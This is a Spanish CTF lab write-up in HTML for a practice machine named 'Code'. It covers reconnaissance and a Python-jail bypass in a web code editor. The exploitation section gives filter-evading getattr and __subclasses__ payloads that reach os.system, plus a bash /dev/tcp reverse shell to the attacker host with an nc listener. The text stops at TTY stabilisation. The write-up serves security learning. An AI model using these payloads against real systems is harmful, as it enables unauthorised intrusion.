<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>Code - Writeups Hacking</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/writeups-hacking/_astro/ClientRouter.astro_astro_type_script_index_0_lang.DZnDNxNb.js"></script><link rel="stylesheet" href="/writeups-hacking/_astro/_id_.Cua1sQfT.css">
<style>.astro-route-announcer{position:absolute;left:0;top:0;clip:rect(0 0 0 0);clip-path:inset(50%);overflow:hidden;white-space:nowrap;width:1px;height:1px}/*! tailwindcss v4.1.12 | MIT License | https://tailwindcss.com */html{color:#fff;background:#13151a;font-family:system-ui,sans-serif}body{padding-inline:calc(var(--spacing,.25rem)*5);padding-block:calc(var(--spacing,.25rem)*20);place-content:center;display:grid}body>div{width:100%}@media (min-width:40rem){body>div{max-width:40rem}}@media (min-width:48rem){body>div{max-width:48rem}}@media (min-width:64rem){body>div{max-width:64rem}}@media (min-width:80rem){body>div{max-width:80rem}}@media (min-width:96rem){body>div{max-width:96rem}}body.writeup-page{margin:calc(var(--spacing,.25rem)*0);padding-inline:calc(var(--spacing,.25rem)*0);padding-top:calc(var(--spacing,.25rem)*4);padding-bottom:calc(var(--spacing,.25rem)*20)}@media (min-width:40rem){body.writeup-page{padding-inline:calc(var(--spacing,.25rem)*5)}}@media (min-width:48rem){body.writeup-page{padding-inline:calc(var(--spacing,.25rem)*5)}}@media (min-width:64rem){body.writeup-page{padding-inline:calc(var(--spacing,.25rem)*10)}}@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
</style><style>[data-astro-transition-scope="astro-gnbmvgz7-1"] { view-transition-name: writeups-title-group; }@layer astro { ::view-transition-old(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(writeups-title-group) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-gnbmvgz7-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-gnbmvgz7-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-utklmmm4-2"] { view-transition-name: img-code; }@layer astro { ::view-transition-old(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(img-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-utklmmm4-2"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-utklmmm4-2"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-3hsjm4tw-3"] { view-transition-name: title-code; }@layer astro { ::view-transition-old(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(title-code) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-3hsjm4tw-3"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-3hsjm4tw-3"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body class="writeup-page"> <div class="layout-body"> <!-- Contenedor principal --> <main class="w-full mx-auto px-4 sm:px-6 lg:px-12 prose prose-invert max-w-full">   <div class="flex flex-col md:flex-row gap-12"> <!-- Aside --> <aside class="flex flex-col items-center gap-4 w-full md:w-64"> <div class="sticky top-1 flex flex-col items-center"> <!-- TÃ­tulo principal y logo --> <div class="text-center" data-astro-transition-scope="astro-gnbmvgz7-1"> <div class="flex flex-row items-center gap-1 justify-center"> <span class="text-3xl font-extrabold text-[#bfff00]">Writeups</span> <img src="/code/hacker.svg" alt="Logo" class="w-10 h-10"> </div> <span class="text-3xl font-extrabold text-[#bfff00] mt-0">Hacking</span> </div> <!-- BotÃ³n volver --> <a href="/" class="mt-4 text-xl text-white opacity-70 hover:underline">
â Volver atrÃ¡s
</a> <!-- Imagen de la mÃ¡quina --> <img class="rounded w-full max-w-xs md:w-55 h-auto mt-6" src="/code/Code_logo.png" alt="Code" data-astro-transition-scope="astro-utklmmm4-2"> </div> </aside> <!-- Main Content --> <main class="w-full md:max-w-3xl flex-1"> <h1 class="text-6xl font-bold mb-6" data-astro-transition-scope="astro-3hsjm4tw-3">Code</h1> <!-- Skills Section estilo Markdown con colores --> <div class="mb-8 border-4 border-[#bfff00] rounded-lg p-6 bg-[#0f0f0f]"> <h3 class="text-3xl font-bold text-center text-[#CCCCCC] py-2
                    hover:text-[#888888] hover:border-[#888888] transition-colors duration-300">
Skills
</h3> <hr class="my-0 border-t-4 border-[#bfff00]"> <ul class="w-full mt-4 flex flex-wrap justify-center gap-2 sm:gap-3"> <li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 1. Web Enumeration </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 2. Python Jail (Reverse Shell Restriction Bypass) </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 3. Database SQLite File Enumeration </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 4. Cracking Hashes </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 5. Directory Path Traversal Restriction Bypass </li><li class="inline-block text-center bg-[#1f1f1f] text-[#bfff00] px-3 py-2 sm:px-4 sm:py-2 rounded-full font-medium
              hover:bg-[#888888] hover:text-black transition-colors duration-300 break-words text-sm sm:text-base max-w-full"> 6. Abusing Sudoers (Privelege Escalation) </li> </ul> </div> <!-- Markdown Content --> <div class="markdown space-y-4"> <h3 id="descripciÃ³n">DescripciÃ³n</h3>
<p>Code es una mÃ¡quina Linux sencilla que cuenta con una aplicaciÃ³n web Python Code Editor vulnerable a la ejecuciÃ³n remota de cÃ³digo mediante un bypass de Python Jail. DespuÃ©s de obtener acceso como usuario de producciÃ³n de la aplicaciÃ³n, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una secciÃ³n de cÃ³digo vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raÄ±Ìz.</p>
<h3 id="objetivos">Objetivos</h3>
<h4 id="objetivo-general">Objetivo general</h4>
<p>Desarrollar habilidades de anÃ¡lisis y explotaciÃ³n en entornos restringidos de ejecuciÃ³n de cÃ³digo en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasiÃ³n de filtros y seguridad en aplicaciones que ejecutan cÃ³digo dinÃ¡mico.. Como es el caso de la MÃ¡quina Code.</p>
<h4 id="objetivos-especificos">Objetivos Especificos</h4>
<ul>
<li>Comprender el funcionamiento interno del lenguaje Python, incluyendo introspecciÃ³n, objetos y estructuras dinÃ¡micas como builtins , getattr, eval y exec.</li>
<li>Identificar y evadir mecanismos de restricciÃ³n artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail.</li>
<li>Aplicar tÃ©cnicas ofensivas de bypass, como reconstrucciÃ³n de funciones prohibidas, manipulaciÃ³n de clases y uso de expresiones indirectas para ejecutar cÃ³digo arbitrario.</li>
<li>Evaluar los riesgos de seguridad asociados con la ejecuciÃ³n de cÃ³digo Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.<br></li>
</ul>
<h3 id="analisis-de-vulnerabilidades">Analisis de Vulnerabilidades</h3>
<h4 id="reconocimiento-inicial">Reconocimiento Inicial</h4>
<p>Se comenzÃ³ realizando un anÃ¡lisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificaciÃ³n resultÃ³ fundamental para asegurar que la comunicaciÃ³n entre el host atacante y el sistema de destino fuera posible antes de iniciar fases mÃ¡s avanzadas de la evaluaciÃ³n. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorÄ±Ìas de seguridad:</p>
<p><strong>Ping</strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, ademÃ¡s de obtener informaciÃ³n bÃ¡sica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el <strong>TTL</strong>.</p>
<p><a href="/code/ping.png"><img src="/code/ping.png" alt="EjecuciÃ³n del comando ping"></a></p>
<p><strong>Nmap</strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.</p>
<p><a href="/code/nmap.png"><img src="/code/nmap.png" alt="EjecuciÃ³n del comando ping"></a></p>
<p>Este proceso inicial permitiÃ³ obtener una visiÃ³n general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluaciÃ³n.</p>
<h3 id="analisis-de-los-servicios-activos">Analisis de los servicios activos</h3>
<p>Seguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo mÃ¡s exhaustivo y especÄ±Ìfico sobre cada uno de ellos.</p>
<h4 id="puerto-22-ssh">Puerto 22 (SSH)</h4>
<p>El hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecuciÃ³n, lo que permite establecer una conexiÃ³n remota segura mediante el uso de protocolos de cifrado para la transmisiÃ³n de datos. Este servicio, comÃºnmente utilizado para la administraciÃ³n de servidores y dispositivos de red, brinda acceso a una lÄ±Ìnea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestiÃ³n.</p>
<p>La presencia de SSH implica que, si se dispone de credenciales vÃ¡lidas o se logra explotar alguna vulnerabilidad en su configuraciÃ³n o implementaciÃ³n, un atacante podrÄ±Ìa obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versiÃ³n exacta del servicio, verificar la fortaleza de los mecanismos de autenticaciÃ³n implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versiÃ³n especÄ±Ìfica.</p>
<p>En el contexto de una evaluaciÃ³n de seguridad, este hallazgo se considera un punto de interÃ©s clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.</p>
<p>El analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la
siguiente imagen:</p>
<p><a href="/code/ssh.png"><img src="/code/ssh.png" alt="Servicio de SSH (Secure Shell)"></a></p>
<h4 id="puerto-5000-servicio-web">Puerto 5000 (Servicio Web)</h4>
<p>Al ejecutar el comando <strong>whatweb</strong> desde la terminal, se obtiene informaciÃ³n detallada acerca de las tecnologÄ±Ìas y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este anÃ¡lisis revela que el servicio estÃ¡ siendo ejecutado mediante <strong>Gunicorn 20.0.4</strong>.</p>
<p><strong>Gunicorn</strong> (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producciÃ³n debido a su simplicidad y eficiencia. La identificaciÃ³n de su versiÃ³n especÄ±Ìfica, en este caso <strong>20.0.4</strong>, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versiÃ³n. Este tipo de informaciÃ³n es fundamental para orientar fases posteriores de anÃ¡lisis, como la bÃºsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluaciÃ³n de posibles vectores de ataque contra el servicio.</p>
<p><a href="/code/port5000.png"><img src="/code/port5000.png" alt="Servicio web puerto 5000 (Gunicorn)"></a></p>
<p>Al acceder al servicio web mediante un navegador utilizando la URL <a href="http://10.10.11.62:5000">http://10.10.11.62:5000</a>, se observa que el sistema estÃ¡ ejecutando un editor de cÃ³digo para el lenguaje de programaciÃ³n Python. Esta interfaz permite al usuario escribir y ejecutar cÃ³digo Python directamente desde el navegador, lo cual facilita la interacciÃ³n y el desarrollo rÃ¡pido dentro del entorno proporcionado.</p>
<p>Si bien esta funcionalidad puede resultar muy Ãºtil en contextos controlados y para propÃ³sitos legÄ±Ìtimos, tambiÃ©n implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar cÃ³digo remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crÄ±Ìticas, tales como la ejecuciÃ³n arbitraria de cÃ³digo, escalaciÃ³n de privilegios o acceso no autorizado a recursos sensibles.</p>
<p><a href="/code/webpage.png"><img src="/code/webpage.png" alt="Pagina web que corre un editor de cÃ³digo en lÄ±Ìnea"></a></p>
<h3 id="explotaciÃ³n-del-sistema">ExplotaciÃ³n del Sistema</h3>
<p>Dado que podemos ejecutar cÃ³digo directamente desde la pÃ¡gina de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos mÃ³dulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas Ãºtiles que interactÃºan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y mÃ³dulos potencialmente peligrosos.</p>
<p><a href="/code/payload1.png"><img src="/code/payload1.png" alt="ImplementaciÃ³n de reglas para impedir el uso de cargas Ãºtiles"></a></p>
<p>Dada la presencia de mecanismos de filtrado que restringen la ejecuciÃ³n directa de cÃ³digo en el servicio web, se torna indispensable identificar mÃ©todos para eludir estos filtros con el fin de avanzar en la evaluaciÃ³n de seguridad. Para ello, se llevÃ³ a cabo una investigaciÃ³n exhaustiva utilizando palabras clave como âpython bypassâ en motores de bÃºsqueda y bases de datos especializadas.</p>
<p>Como resultado, se localizaron mÃºltiples artÄ±Ìculos y recursos tÃ©cnicos que describen diversas tÃ©cnicas para superar las restricciones impuestas en entornos Python. Estas tÃ©cnicas incluyen manipulaciÃ³n avanzada de la sintaxis, uso de codificaciones alternativas, construcciÃ³n dinÃ¡mica de cÃ³digo y explotaciÃ³n de vulnerabilidades en componentes especÄ±Ìficos.</p>
<p>La informaciÃ³n recopilada servirÃ¡ como fundamento para la implementaciÃ³n de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.</p>
<h4 id="uso-de-build-in">Uso de build-in</h4>
<p>En Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que estÃ¡n disponibles de forma inmediata sin necesidad de importar ningÃºn mÃ³dulo o librerÄ±Ìa adicional. Estos elementos forman parte del nÃºcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programaciÃ³n.</p>
<h3 id="uso-de-getattr-para-evadir-restricciones-en-python">Uso de getattr para evadir restricciones en Python</h3>
<p>La funciÃ³n incorporada getattr(objeto, nombre atributo) en Python permite acceder dinÃ¡micamente a los atributos o mÃ©todos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente Ãºtil para evadir filtros y restricciones que bloquean el acceso directo a funciones o mÃ©todos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explÄ±Ìcitas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intenciÃ³n real del cÃ³digo. Como en el siguiente cÃ³digo:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">test </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> getattr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__self__</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'__im'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'port__'</span><span style="color:#E1E4E8">) (</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 's'</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">getattr</span><span style="color:#E1E4E8">(test, </span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'stem'</span><span style="color:#E1E4E8">)( </span><span style="color:#9ECBFF">'whoami'</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>Otro mÃ©todo efectivo para evadir restricciones en entornos Python estÃ¡ explicado en un
<a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d" class="text-blue-500 font-bold underline hover:text-blue-700 transition">
artÃ­culo publicado en Medium
</a>. A continuaciÃ³n, se presenta el fragmento de cÃ³digo descrito en dicho artÃ­culo:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">[w </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> w </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">..</span><span style="color:#79B8FF">__class__</span><span style="color:#E1E4E8">.__base__.</span><span style="color:#79B8FF">__subclasses__</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> w.</span><span style="color:#79B8FF">__name__</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'Quitter'</span><span style="color:#E1E4E8">][</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].</span><span style="color:#79B8FF">__init__</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__globals__</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'s'</span><span style="color:#E1E4E8">].modules[</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'s'</span><span style="color:#E1E4E8">].</span><span style="color:#79B8FF">__dict__</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'stem'</span><span style="color:#E1E4E8">](</span><span style="color:#9ECBFF">'ls'</span><span style="color:#E1E4E8">)</span></span></code></pre>
<h4 id="ejecuciÃ³n-de-comandos-en-el-sistema">EjecuciÃ³n de comandos en el sistema</h4>
<p>Esto nos permitirÃ¡ ejecutar comandos de shell sin utilizar palabras clave prohibidas como <strong>âªimportâ«</strong> u <strong>âªosâ«</strong> directamente, utilizando la concatenaciÃ³n de cadenas, es decir, <strong>âªoâ«</strong> + <strong>âªsâ«</strong>. Sin embargo, tras ejecutar el cÃ³digo, no vemos ningÃºn resultado. Esto sugiere que, aunque el cÃ³digo se estÃ© ejecutando en el host, el resultado no se estÃ¡ devolviendo al frontend. Para verificar si se estÃ¡ ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra mÃ¡quina utilizando un sencillo listener con el comando <strong>tcpdump</strong> para capturar la respuesta del comando <strong>ping</strong> ejecutado desde el servicio web.</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">test </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> getattr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__self__</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'__im'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'port__'</span><span style="color:#E1E4E8">) (</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 's'</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">getattr</span><span style="color:#E1E4E8"> (test, </span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'stem'</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">'ping -c 1 10.10.x.x'</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>EjecuciÃ³n del cÃ³digo python en la web:</p>
<p><a href="/code/payload2.png"><img src="/code/payload2.png" alt="CÃ³digo python en la web"></a></p>
<p>Recibimos respuesta por parte del servido al ejecutar el comandon <strong>ping</strong>:</p>
<p><a href="/code/term1.png"><img src="/code/term1.png" alt="Respuesta del comando ping"></a></p>
<p>Seguidamente ejecutaremos el siguiente cÃ³digo en el servicio web para obtener una <strong>shell inversa</strong> mediante <strong>Netcat</strong>:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">test </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> getattr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__self__</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'__im'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'port__'</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">'o'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 's'</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">getattr</span><span style="color:#E1E4E8">(test, </span><span style="color:#9ECBFF">'sy'</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> 'stem'</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">'bash -c "bash -i >&#x26; /dev/tcp/10.10.x.x/443 0>&#x26;1" '</span><span style="color:#E1E4E8">)</span></span></code></pre>
<p>Y ejecutamos en nuestra mÃ¡quina de atacante <strong>Netcat</strong> en el puerto que especificamos en el comando anterior:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -lnvp</span><span style="color:#79B8FF"> 443</span></span></code></pre>
<p>Al ejecutar el cÃ³digo en el servicio web, este establece una conexiÃ³n de retorno hacia nuestra mÃ¡quina atacante, otorgÃ¡ndonos una <strong>shell inversa</strong>. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviÃ©ramos trabajando desde su propia terminal, posibilitando la ejecuciÃ³n de comandos, la navegaciÃ³n por el sistema de archivos y la recolecciÃ³n de informaciÃ³n sensible en tiempo real.</p>
<p><a href="/code/payload3.png"><img src="/code/payload3.png" alt="Ejecucion del cÃ³digo en el servicio web para obtener una shell inversa"></a></p>
<p>Seguidamente, se procede a realizar un tratamiento de la <strong>TTY</strong> con el fin de mejorar la interacciÃ³n con la sesiÃ³n obtenida. Este proceso incluye la configuraciÃ³n de una terminal completamente funcional que soporte caracterÄ±Ìsticas como ediciÃ³n de lÄ±Ìnea, autocompletado y manejo de seÃ±ales. De esta manera, al presionar combinaciones de teclas como <strong>Ctrl + C</strong>, la conexiÃ³n no se interrumpe y se mantiene la estabilidad de la sesiÃ³n.</p>
